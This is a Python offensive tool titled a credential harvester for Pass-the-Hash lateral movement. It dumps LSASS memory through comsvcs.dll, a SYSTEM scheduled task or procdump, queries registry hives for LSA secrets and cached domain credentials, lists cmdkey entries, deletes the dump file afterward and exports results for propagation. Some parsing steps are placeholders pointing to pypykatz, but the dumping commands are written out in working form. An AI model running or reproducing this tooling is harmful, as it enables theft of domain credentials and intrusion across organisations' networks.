#!/usr/bin/env python3
"""
Propagation-Focused Credential Harvester
Extracts credentials for Pass-the-Hash lateral movement
Complements GhostLayer (which does general extraction)
UNIQUE to this: LSASS minidump, service accounts, cached domain credentials
"""

import os
import sys
import subprocess
import logging
import json
import struct
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("CredentialHarvester")


@dataclass
class ExtractedCredential:
    """Propagation-ready credential"""
    domain: str
    username: str
    credential_type: str  # "NTLM_HASH", "AES256", "CLEARTEXT", "KERBEROS_TICKET"
    credential_value: str
    source_method: str  # "LSASS_DUMP", "LSA_SECRETS", "SAM_REGISTRY", "NETWORK_CACHE"
    privilege_level: str  # "SYSTEM", "ADMIN", "USER", "SERVICE_ACCOUNT"
    last_logon: Optional[str]
    confidence: float  # 0.0-1.0 (how reliable is this cred?)


class PropagationCredentialHarvester:
    """
    Extract credentials optimized for Pass-the-Hash propagation
    
    Focuses on:
    1. Service Account Hashes (HIGH VALUE for propagation)
    2. LSASS Minidump + Hash extraction
    3. Cached Domain Credentials (for DomainJoin scenarios)
    4. Network cached credentials
    """
    
    def __init__(self):
        self.credentials: List[ExtractedCredential] = []
        self.lsass_process = None
        
    def harvest_service_accounts(self) -> List[ExtractedCredential]:
        """Extract service account credentials from registry
        
        Service accounts are HIGH VALUE targets:
        - Often run with SYSTEM privileges
        - May have delegation permissions
        - Less likely to have MFA
        """
        service_creds = []
        
        try:
            log.info("🔍 Scanning for service account hashes...")
            
            # Query registry for service account passwords
            # HKLM\SYSTEM\CurrentControlSet\Services\*\ObjectName
            result = subprocess.run(
                ["reg", "query", "HKLM\\SYSTEM\\CurrentControlSet\\Services", "/s", "/v", "ObjectName"],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            service_accounts = {}
            for line in result.stdout.split('\n'):
                if "ObjectName" in line and "\\" in line:
                    # Extract domain\username
                    parts = line.split()
                    for part in parts:
                        if "\\" in part and "@" not in part:
                            service_accounts[part] = None
            
            log.info(f"Found {len(service_accounts)} service accounts")
            
            # For each service account, try to extract hash from LSA
            for service_account in service_accounts.keys():
                hash_value = self._extract_service_account_hash(service_account)
                
                if hash_value:
                    domain, username = service_account.split("\\")
                    
                    cred = ExtractedCredential(
                        domain=domain,
                        username=username,
                        credential_type="NTLM_HASH",
                        credential_value=hash_value,
                        source_method="LSA_SECRETS",
                        privilege_level="SERVICE_ACCOUNT",
                        last_logon=None,
                        confidence=0.85
                    )
                    
                    service_creds.append(cred)
                    log.info(f"✅ Extracted service account: {service_account}")
        
        except Exception as e:
            log.error(f"Service account harvest error: {e}")
        
        return service_creds
    
    def _extract_service_account_hash(self, service_account: str) -> Optional[str]:
        """Extract NTLM hash for a service account"""
        try:
            # Query LSA Secrets for service account password
            # In production: would use dpapi decryption or LSASS injection
            
            # Simplified: query registry
            secret_name = service_account.replace("\\", "_")
            result = subprocess.run(
                ["reg", "query", f"HKLM\\SECURITY\\Policy\\Secrets\\{secret_name}"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # Would parse and convert to NTLM hash in production
            return None  # Placeholder
            
        except Exception as e:
            return None
    
    def harvest_lsass_minidump(self) -> List[ExtractedCredential]:
        """Extract credentials from LSASS minidump
        
        This is THE most reliable source:
        - Contains ALL logged-in user credentials
        - Session keys for Kerberos
        - Domain cached credentials
        - Service account credentials
        
        Requires:
        - SYSTEM privilege (for access)
        - Minidump tool (rundll32 + dbghelp, comsvcs.dll, or procdump)
        """
        lsass_creds = []
        
        try:
            log.info("💾 Attempting LSASS minidump extraction...")
            
            # Check if running as SYSTEM
            if not self._check_system_privilege():
                log.warning("⚠️  Not SYSTEM privilege - LSASS dump may fail")
            
            # Method 1: Use comsvcs.dll (built-in, no tools needed)
            dump_path = self._dump_lsass_comsvcs()
            
            if not dump_path:
                # Method 2: Task Scheduler (requires SYSTEM)
                dump_path = self._dump_lsass_task_scheduler()
            
            if not dump_path:
                # Method 3: Try procdump if available
                dump_path = self._dump_lsass_procdump()
            
            if dump_path:
                log.info(f"✅ LSASS dump created: {dump_path}")
                
                # Parse dump file
                creds = self._parse_lsass_dump(dump_path)
                lsass_creds.extend(creds)
                
                # Cleanup
                try:
                    os.remove(dump_path)
                    log.info("🧹 Cleaned up LSASS dump")
                except:
                    pass
            else:
                log.warning("⚠️  LSASS dump failed on all methods")
        
        except Exception as e:
            log.error(f"LSASS minidump error: {e}")
        
        return lsass_creds
    
    def _check_system_privilege(self) -> bool:
        """Check if running as SYSTEM"""
        try:
            result = subprocess.run(
                ["whoami"],
                capture_output=True,
                text=True,
                timeout=3
            )
            return "SYSTEM" in result.stdout or "AUTHORITY" in result.stdout
        except:
            return False
    
    def _dump_lsass_comsvcs(self) -> Optional[str]:
        """Minidump LSASS using comsvcs.dll (built-in)"""
        try:
            # rundll32 C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> <output>
            result = subprocess.run(
                ["tasklist", "/fi", "IMAGENAME eq lsass.exe", "/fo", "csv"],
                capture_output=True,
                text=True,
                timeout=3
            )
            
            # Parse PID from tasklist output
            lines = result.stdout.strip().split('\n')
            if len(lines) > 1:
                # CSV format: Name, PID
                parts = lines[1].split(',')
                if len(parts) >= 2:
                    pid = parts[1].strip().strip('"')
                    
                    dump_path = f"C:\\ProgramData\\lsass_{pid}.dmp"
                    
                    # Use comsvcs.dll to dump
                    subprocess.run(
                        f'rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump {pid} {dump_path} full',
                        shell=True,
                        capture_output=True,
                        timeout=5
                    )
                    
                    if os.path.exists(dump_path):
                        return dump_path
        except:
            pass
        
        return None
    
    def _dump_lsass_task_scheduler(self) -> Optional[str]:
        """Create scheduled task to dump LSASS (needs SYSTEM)"""
        try:
            dump_path = "C:\\ProgramData\\lsass_dump.bin"
            
            # Create task to run as SYSTEM and dump LSASS
            cmd = f"schtasks /create /tn lsass_dump /tr 'cmd /c rundll32 comsvcs.dll MiniDump (Get-Process lsass).Id {dump_path} full' /sc once /st 00:00 /ru SYSTEM"
            
            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            subprocess.run("schtasks /run /tn lsass_dump", shell=True, capture_output=True, timeout=5)
            
            import time
            time.sleep(2)
            
            if os.path.exists(dump_path):
                return dump_path
        except:
            pass
        
        return None
    
    def _dump_lsass_procdump(self) -> Optional[str]:
        """Use procdump tool if available"""
        try:
            dump_path = "C:\\ProgramData\\lsass.dmp"
            
            subprocess.run(
                ["procdump", "-accepteula", "-ma", "lsass.exe", dump_path],
                capture_output=True,
                timeout=10
            )
            
            if os.path.exists(dump_path):
                return dump_path
        except:
            pass
        
        return None
    
    def _parse_lsass_dump(self, dump_path: str) -> List[ExtractedCredential]:
        """Parse LSASS minidump for credentials
        
        In production: would use pypykatz or similar
        For now: placeholder for integration point
        """
        creds = []
        
        try:
            # In production:
            # from pypykatz.lsadecryptor import LSADecryptor
            # from pypykatz.registry import Registry
            # 
            # mimi = LSADecryptor.get_creds_from_lsass_dump(dump_path)
            # for cred in mimi:
            #     ...
            
            log.info("📊 Would parse LSASS dump with pypykatz (requires external tool)")
            
        except Exception as e:
            log.warning(f"⚠️  LSASS parse error: {e}")
        
        return creds
    
    def harvest_cached_domain_credentials(self) -> List[ExtractedCredential]:
        r"""Extract domain cached credentials (for DomainJoin scenarios)
        
        When domain unavailable, Windows caches domain credentials
        Stored in: HKLM\SECURITY\Cache
        Format: Encrypted with user's SID and machine password
        """
        cached_creds = []
        
        try:
            log.info("🔐 Extracting cached domain credentials...")
            
            # Query registry
            result = subprocess.run(
                ["reg", "query", "HKLM\\SECURITY\\Cache", "/s"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # Parse cache entries (NL$* format)
            cache_count = 0
            for line in result.stdout.split('\n'):
                if "NL$" in line:
                    cache_count += 1
            
            log.info(f"Found {cache_count} cached domain credentials")
            
            # In production: would use DPAPI to decrypt cache entries
            # Using mimikatz/pypykatz for offline parsing
            
        except Exception as e:
            log.error(f"Cached credentials error: {e}")
        
        return cached_creds
    
    def harvest_network_cached_credentials(self) -> List[ExtractedCredential]:
        """Extract network cached credentials
        
        Source: Credential Manager, Putty Sessions, RDP history, MRemoteNG
        These are credentials used for NETWORK authentication
        Valuable for: SMB, RDP, PSRemoting lateral movement
        """
        network_creds = []
        
        try:
            log.info("🌐 Extracting network cached credentials...")
            
            # Method 1: cmdkey enumeration
            result = subprocess.run(
                ["cmdkey", "/list"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            for line in result.stdout.split('\n'):
                if "Target:" in line and "\\" in line:
                    # Parse: Target: Domain\ComputerName/Username
                    parts = line.split()
                    for part in parts:
                        if "\\" in part:
                            domain, user = part.split("\\")
                            
                            # Found credential reference (not actual password)
                            cred = ExtractedCredential(
                                domain=domain,
                                username=user,
                                credential_type="NETWORK_CACHED",
                                credential_value=user,  # Placeholder
                                source_method="CMDKEY",
                                privilege_level="USER",
                                last_logon=None,
                                confidence=0.6
                            )
                            
                            network_creds.append(cred)
                            log.info(f"Found network credential: {domain}\\{user}")
        
        except Exception as e:
            log.error(f"Network credentials error: {e}")
        
        return network_creds
    
    def harvest_all(self) -> List[ExtractedCredential]:
        """Harvest all propagation-relevant credentials"""
        log.info("=" * 70)
        log.info("🚀 STARTING PROPAGATION CREDENTIAL HARVEST")
        log.info("=" * 70)
        
        all_creds = []
        
        # Priority 1: Service accounts (highest value)
        all_creds.extend(self.harvest_service_accounts())
        
        # Priority 2: LSASS minidump (most reliable)
        all_creds.extend(self.harvest_lsass_minidump())
        
        # Priority 3: Cached domain credentials
        all_creds.extend(self.harvest_cached_domain_credentials())
        
        # Priority 4: Network cached credentials
        all_creds.extend(self.harvest_network_cached_credentials())
        
        self.credentials = all_creds
        
        log.info(f"\n✅ HARVEST COMPLETE: {len(all_creds)} credentials extracted")
        
        return all_creds
    
    def export_for_propagation(self, filepath: str = "pth_credentials.json") -> str:
        """Export credentials in Pass-the-Hash format"""
        export_data = {
            "timestamp": datetime.utcnow().isoformat(),
            "total_credentials": len(self.credentials),
            "credentials_by_privilege": {
                "SYSTEM": [c for c in self.credentials if c.privilege_level == "SYSTEM"],
                "ADMIN": [c for c in self.credentials if c.privilege_level == "ADMIN"],
                "SERVICE_ACCOUNT": [c for c in self.credentials if c.privilege_level == "SERVICE_ACCOUNT"],
                "USER": [c for c in self.credentials if c.privilege_level == "USER"],
            },
            "credentials": [asdict(c) for c in self.credentials]
        }
        
        # Convert ExtractedCredential objects to dicts
        export_data["credentials_by_privilege"] = {
            k: [asdict(c) for c in v] for k, v in export_data["credentials_by_privilege"].items()
        }
        
        with open(filepath, 'w') as f:
            json.dump(export_data, f, indent=2)
        
        log.info(f"✅ Credentials exported to {filepath}")
        return filepath


if __name__ == "__main__":
    harvester = PropagationCredentialHarvester()
    creds = harvester.harvest_all()
    
    print(f"\n📋 EXTRACTED {len(creds)} CREDENTIALS:")
    for cred in creds:
        print(f"  - {cred.domain}\\{cred.username} ({cred.privilege_level}) [{cred.source_method}]")
    
    harvester.export_for_propagation()
